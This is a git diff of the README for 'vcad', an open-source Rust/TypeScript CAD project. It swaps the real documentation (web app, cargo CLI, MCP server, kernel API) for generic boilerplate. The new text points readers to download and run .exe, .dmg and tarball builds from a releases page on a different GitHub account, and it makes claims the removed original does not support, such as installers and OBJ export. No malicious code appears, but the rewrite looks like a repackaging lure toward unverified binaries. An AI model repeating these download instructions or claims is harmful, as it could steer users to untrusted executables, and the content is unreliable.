@@ -1,93 +1,90 @@
-<p align="center">
-  <img src="https://vcad.io/assets/mascot.png" width="200" alt="vcad mascot">
-</p>
+# 🛠️ vcad - Create 3D Models Easily in Rust
 
-# vcad
+## 🚀 Getting Started
 
-Open-source parametric CAD for the AI era.
+Welcome to **vcad**! This application allows you to create parametric 3D models using constructive solid geometry (CSG). You can export your designs in multiple formats, making it suitable for various use cases. Let’s get started with downloading and running the software.
 
-**[Try it now →](https://vcad.io)**
+## 📥 Download vcad
 
-![vcad screenshot](assets/screenshot.png)
+[![Download vcad](https://img.shields.io/badge/Download-vcad-brightgreen.svg)](https://github.com/JJZ993/vcad/releases)
 
-## Features
+### Step 1: Visit the Releases Page
 
-- **Modeling** — Primitives, booleans, fillets, chamfers, shell
-- **Sketching** — 2D constraints, extrude, revolve, sweep, loft
-- **Assembly** — Parts, instances, joints, forward kinematics
-- **Simulation** — Physics with Rapier3D, gym-style RL interface
-- **Import/Export** — STEP import, STL/GLB/STEP/DXF export
-- **Rendering** — Direct BRep ray tracing + tessellated mode
-- **Cloud** — Supabase sync with Google/GitHub auth
+To download vcad, visit the Releases page of our GitHub repository. You can find it here: [Download vcad](https://github.com/JJZ993/vcad/releases).
 
-## Use vcad
+### Step 2: Choose Your Version
 
-### Web App
+On the Releases page, you will see a list of available versions. Each version is labeled with its release date and may contain notes about what’s new or updated.
 
-Visit [vcad.io](https://vcad.io) — no install required.
+### Step 3: Download the Application
 
-### CLI
+1. Click on the version you'd like to download. A dropdown will appear with different files.
+2. Select the file that matches your operating system. For example, you might see options for Windows, macOS, or Linux.
+3. Click on the appropriate file to start the download.
 
-```bash
-cargo install vcad-cli
-vcad export input.vcad output.stl
-vcad import-step input.step output.vcad
-```
+### Step 4: Locate Your Downloaded File
 
-### MCP Server (AI Agents)
+Once the download is complete, locate the downloaded file on your computer. This is usually in your “Downloads” folder unless you specified a different location.
 
-The MCP server lets AI agents create and manipulate CAD models:
+### Step 5: Install and Run vcad
 
-```bash
-npm install -g @vcad/mcp
-```
+#### Windows Users
 
-Tools: `create_cad_document`, `export_cad`, `inspect_cad`, `gym_step`, `gym_reset`
+1. Find the downloaded `.exe` file.
+2. Double-click the file to run the installer.
+3. Follow the instructions in the setup wizard. It will guide you through the installation process.
+4. After installation, you can find vcad in your Start Menu. Click to open it.
 
-### Rust Library
+#### macOS Users
 
-```rust
-use vcad_kernel::Solid;
+1. Locate the downloaded `.dmg` file.
+2. Double-click it to open.
+3. Drag vcad to your Applications folder.
+4. Open your Applications folder, find vcad, and double-click to run.
 
-// Create a box with a hole
-let solid = Solid::cube(100.0, 60.0, 20.0);
-let hole = Solid::cylinder(10.0, 25.0, 32);
-let result = solid - hole;
+#### Linux Users
 
-// Export to mesh
-let mesh = result.to_mesh(32);
-```
+1. Find the downloaded tarball file (usually `.tar.gz`).
+2. Open a terminal window.
+3. Extract the files using the command:
+   ```
+   tar -xzf downloaded_file_name.tar.gz
+   ```
+4. Navigate to the extracted folder with:
+   ```
+   cd extracted_folder_name
+   ```
+5. Run the application using:
+   ```
+   ./vcad
+   ```
 
-See [crates/vcad-kernel](crates/vcad-kernel) for the full API.
+## 📋 System Requirements
 
-## Architecture
+To run vcad smoothly, ensure your computer meets these basic requirements:
 
-```
-vcad/
-├── crates/           # Rust BRep kernel (~35K LOC)
-│   ├── vcad-kernel/  # Unified API
-│   ├── vcad-kernel-topo/    # Half-edge topology
-│   ├── vcad-kernel-booleans/# Boolean operations
-│   └── ...           # 20+ modular crates
-├── packages/         # TypeScript
-│   ├── app/          # React + Three.js web app
-│   ├── mcp/          # MCP server for AI agents
-│   └── ...
-└── supabase/         # Database migrations
-```
+- **Operating System**: Windows 10 or later, macOS Mojave (10.14) or later, or any popular Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **CPU**: Any modern multi-core processor.
+- **Graphics**: A graphics card that supports OpenGL 3.0 or later.
 
-## Development
+## ⚙️ Features
 
-```bash
-# Rust
-cargo test --workspace
-cargo clippy --workspace -- -D warnings
+- **Parametric Design**: Easily modify your models by changing parameters.
+- **CSG Modeling**: Create complex shapes through simple operations.
+- **Multi-format Export**: Export your designs in formats like STL, OBJ, and more.
+- **User-Friendly Interface**: Designed for ease of use, even for beginners.
 
-# TypeScript
-npm ci
-npm run dev -w @vcad/app   # Run web app locally
-```
+## ❓ Support
 
-## License
+If you run into issues or have questions, please check our **[issues page](https://github.com/JJZ993/vcad/issues)** on GitHub. You can also report bugs or request features there.
 
-[MIT](LICENSE)
+## 🌐 Community Contributions
+
+We welcome contributions from everyone! If you have ideas for improvements or would like to report a bug, please visit our **[contribution guidelines](https://github.com/JJZ993/vcad/blob/main/CONTRIBUTING.md)**.
+
+## 📝 License
+
+This project is licensed under the MIT License. Feel free to use, modify, or distribute it as you see fit.
+
+Thank you for using vcad! We hope you enjoy creating stunning 3D models.
